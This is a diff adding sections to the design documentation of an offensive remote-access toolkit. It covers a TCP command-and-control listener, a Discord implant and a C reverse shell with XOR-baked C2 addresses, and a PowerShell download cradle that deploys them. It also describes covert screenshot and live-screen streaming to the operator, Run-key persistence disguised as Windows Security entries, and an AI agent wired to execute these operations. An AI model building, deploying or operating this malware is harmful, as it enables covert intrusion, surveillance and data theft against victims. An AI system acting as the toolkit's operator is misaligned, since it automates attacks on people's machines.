@@ -653,3 +653,201 @@ The menu is organized into operational phases:
 ```
 
 Phase 4 OPERATE imports from `cheyanne_ops.py` with graceful fallback (`HAS_OPS` flag). If the module is missing, Phase 4 options print a warning instead of crashing.
+
+---
+
+## 9. TCP C2 v2 — `shell/vader_c2_v2.py`
+
+**Purpose:** Second-generation C2 listener with shortcut commands, HTTP POST-back screenshot/watch, dual-payload deploy, and non-interactive mode for web UI integration.
+
+**Architecture:**
+```
+Target Machine                     Operator Machine
+─────────────                      ─────────────────
+vader_shell.exe ──TCP:4443──────→  vader_c2_v2.py (listener)
+svchost_health.exe ──Discord──→    Discord channel (webhook + bot)
+screenshot POST ──HTTP:8891────→   one-shot receiver → save + open
+watch frames POST ──HTTP:8891──→   receiver → screenshots/watch_latest.jpg
+                                   watch viewer (HTTP:8892) → browser
+```
+
+### 9.1 Shortcut Dispatch
+
+Six shortcuts are registered in `TCP_SHORTCUTS`:
+
+```python
+TCP_SHORTCUTS = {
+    "deploy":     cmd_deploy,
+    "screenshot": cmd_screenshot,
+    "watch":      cmd_watch,
+    "kill":       cmd_kill,
+    "recon":      cmd_recon,
+    "persist":    cmd_persist,
+}
+```
+
+`handle_tcp_command(session, cmd)` splits the input on whitespace, matches the first token against `TCP_SHORTCUTS`, and calls the handler with `(session, *args)`. All shortcuts auto-find the first live TCP session — no `interact` needed.
+
+```
+chey> deploy               Kill old implant + fresh download + launch
+chey> screenshot           Capture screen → HTTP POST back → save + open
+chey> watch                Live screen stream (default refresh interval)
+chey> watch 3              3-second refresh
+chey> kill svchost_update.exe   taskkill on target
+chey> recon                Full target enumeration
+chey> persist              Set dual registry Run keys
+```
+
+### 9.2 Deploy — Dual Payload, Zero Args
+
+**Function:** `cmd_deploy(session, *args)`
+
+Deploy pushes two payloads simultaneously:
+
+| Payload | Binary | C2 Channel |
+|---------|--------|------------|
+| Discord implant | `svchost_health.exe` (PyInstaller) | Discord webhook + bot token |
+| TCP reverse shell | `vader_shell.exe` (compiled C) | TCP :4443 |
+
+The C2 IP is determined automatically via `get_lan_ip()` — iterates network interfaces, picks the first non-127 address. This IP is **XOR-baked** into both payloads at compile time:
+
+- **C shell:** `gen_implant_xor.py --ip <lan_ip>` produces XOR-encoded byte arrays compiled into the binary (key `0x5E`).
+- **Discord implant:** webhook URL, bot token, and C2 host written directly into the Python source before PyInstaller runs.
+
+The operator types `deploy` with zero arguments. The HTTP file server on `:8890` serves both payloads. A PowerShell download cradle is sent to the target session to fetch and execute both.
+
+### 9.3 Screenshot Auto-Pull
+
+**Function:** `cmd_screenshot(session, *args)`
+
+One-shot capture pipeline:
+
+1. `start_screenshot_receiver()` spins up a one-shot HTTP receiver on **port 8891**
+2. PowerShell GDI screenshot command sent to target (`System.Drawing` / `CopyFromScreen`)
+3. Target POSTs raw PNG bytes to `http://<C2_IP>:8891/screenshot`
+4. Receiver saves to `screenshots/screenshot_<timestamp>.png`
+5. `os.startfile()` opens the image in the default viewer
+6. Receiver shuts down after one capture
+
+### 9.4 Watch — Live Screen Stream
+
+**Function:** `cmd_watch(session, *args)`
+
+Three components working in concert:
+
+**Target-side (single PowerShell while-loop):** One command sent to the target runs a `while($true)` loop — capture screen via `System.Drawing`, encode to memory buffer (`MemoryStream`, not disk — avoids stale frame issues), HTTP POST raw bytes to `http://<C2_IP>:8891/watch`, sleep N seconds, repeat. Runs until process is killed.
+
+**Receiver (port 8891):** `start_watch_receiver()` — HTTP server that accepts POSTs. Deletes the old frame file before writing the new one (prevents stale cache). Saves to `screenshots/watch_latest.jpg`.
+
+**Viewer (port 8892):** `start_watch_viewer()` — HTTP server serving an auto-refresh HTML page. Uses **fetch + blob URL pattern** instead of `<img src="...">` reload for Safari compatibility (Safari aggressively caches image sources):
+
+```javascript
+setInterval(async () => {
+    const resp = await fetch('/frame?' + Date.now());
+    const blob = await resp.blob();
+    const url = URL.createObjectURL(blob);
+    document.getElementById('frame').src = url;
+}, 2000);
+```
+
+The viewer is HTTP-served (not `file://`) because `file://` broke auto-refresh in most browsers.
+
+### 9.5 Persist — Dual Registry Keys
+
+**Function:** `cmd_persist(session, *args)`
+
+Sets two `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` keys:
+
+| Registry Value Name | Payload | Mimics |
+|---------------------|---------|--------|
+| `WindowsSecurityHealth` | Discord implant (`svchost_health.exe`) | Windows Security |
+| `WindowsSecurityUpdate` | TCP shell (`vader_shell.exe`) | Windows Update |
+
+Both payloads are first copied to `%USERPROFILE%\.local\bin\` (created if it doesn't exist). A PowerShell one-liner runs `reg add` for both keys. No arguments needed — paths are deterministic.
+
+### 9.6 Non-Interactive Mode — `--tcp-cmd`
+
+The `--tcp-cmd` flag enables single-shot command execution from external callers (primarily the web dashboard):
+
+```cmd
+python vader_c2_v2.py --tcp-cmd "deploy"
+python vader_c2_v2.py --tcp-cmd "screenshot"
+python vader_c2_v2.py --tcp-cmd "persist"
+```
+
+When set, the C2 does NOT enter interactive mode. It connects to the listener, selects the active session, calls `handle_tcp_command(session, args.tcp_cmd)`, and exits. This is the bridge between `vader_ui.py` and the C2 — the web UI spawns the process as a subprocess, captures stdout/stderr, and returns JSON to the browser.
+
+---
+
+## 10. HANDLER Kimi K2.5 Backend — `cheyanne_agent.py`
+
+**Purpose:** AI-powered C2 operator with Kimi K2.5 (MoonshotAI) as the reasoning backend, accessed via OpenRouter.
+
+**Why OpenRouter:** The direct `sk-kimi` API key is agent-locked — only whitelisted agents (Kimi CLI, Claude Code) can use `api.kimi.com/coding/v1`. OpenRouter wraps it with a unified key that works from custom code.
+
+**Model:** `moonshotai/kimi-k2.5` — a reasoning model. Reasoning tokens and content tokens are returned separately.
+
+**Launch:**
+```cmd
+python cheyanne_agent.py --kimi     # Kimi K2.5 via OpenRouter
+python cheyanne_agent.py            # Default (Ollama local)
+python cheyanne_agent.py --claude   # Claude API (requires ANTHROPIC_API_KEY)
+```
+
+**API Key:** `OPENROUTER_API_KEY` from environment or `%LOCALAPPDATA%\hermes\.env`.
+
+**Key functions:**
+- `chat_kimi(messages)` — sends chat completion to OpenRouter with `model="moonshotai/kimi-k2.5"`, `max_tokens=4096`
+- `handle_reasoning_response(response)` — handles Kimi's split `reasoning_content` / `content` response format
+- `parse_tool_call(response)` — extracts `<tool>` blocks from AI output, maps to `cheyanne_ops.py` functions
+- `agent_loop()` — REPL: user input -> Kimi -> parse tool calls -> execute -> feed result back -> next round (up to 3 rounds per message)
+
+Tool definitions are passed to Kimi as function schemas. The agent imports all operations from `cheyanne_ops.py` — same execution layer as the terminal menu and web dashboard.
+
+---
+
+## 11. Web Dashboard — `vader_ui.py`
+
+**Purpose:** Browser-based operator interface with full terminal parity. All 4 phases + TCP shortcuts accessible from any device.
+
+**Stack:** Raw Python `http.server` (stdlib only). Custom `VaderHandler(BaseHTTPRequestHandler)`. Dark terminal aesthetic — black background (`#0a0a0a`), green text (`#00ff41`), red accents.
+
+**Port:** 8666
+
+**Routes:**
+| Method | Path | Purpose |
+|--------|------|---------|
+| `GET /` | Main dashboard HTML | Full UI render |
+| `POST /execute` | Phase action dispatch | `{"phase": "...", "action": "..."}` |
+| `POST /tcp` | TCP shortcut dispatch | `{"cmd": "deploy"}` etc. |
+| `GET /sessions` | List active C2 sessions | JSON response |
+| `GET /status` | System status | JSON response |
+
+**Full Terminal Parity:** The web dashboard exposes all 4 phases and all TCP shortcuts:
+- Phase 1 — Build: Compile, scan, mutate, key status
+- Phase 2 — Stealth: Dark room, cloak build/test/activate
+- Phase 3 — Deploy: C2 shell, build implant, auto deploy
+- Phase 4 — Operate: Sessions, screenshot, browse, exfil, upload, recon + all TCP shortcuts (deploy, screenshot, watch, kill, recon, persist)
+
+**TCP command dispatch:** POST to `/tcp` with `{"cmd": "deploy"}` spawns `python vader_c2_v2.py --tcp-cmd "deploy"` as a subprocess, captures output, returns JSON to the browser.
+
+**Mobile Responsive:** Viewport meta tag, CSS media queries at `max-width: 768px` and `480px`, flexbox with `flex-wrap`, minimum 44px tap targets for touch, collapsible sidebar on mobile, horizontal scroll for terminal output on small screens.
+
+---
+
+## 12. Firewall Configuration — `setup_firewall.bat`
+
+**Purpose:** Create permanent Windows Firewall inbound rules for all CHEYANNE ports. Rules survive reboots. Requires admin elevation.
+
+**Ports:**
+
+| Port | Rule Name | Component |
+|------|-----------|-----------|
+| 4443 | CHEYANNE-C2 | TCP C2 listener (reverse shell callback) |
+| 8666 | CHEYANNE-UI | Web dashboard |
+| 8667 | CHEYANNE-AGENT | Binary agent protocol |
+| 8890 | CHEYANNE-SERVE | HTTP file server (payload delivery) |
+| 8891 | CHEYANNE-RECV | Screenshot/Watch receiver (target POST-back) |
+| 8892 | CHEYANNE-WATCH | Watch live viewer (browser auto-refresh) |
+
+The script cleans old rules first (idempotent), then adds all six via `netsh advfirewall firewall add rule`. Run once on a fresh operator machine.
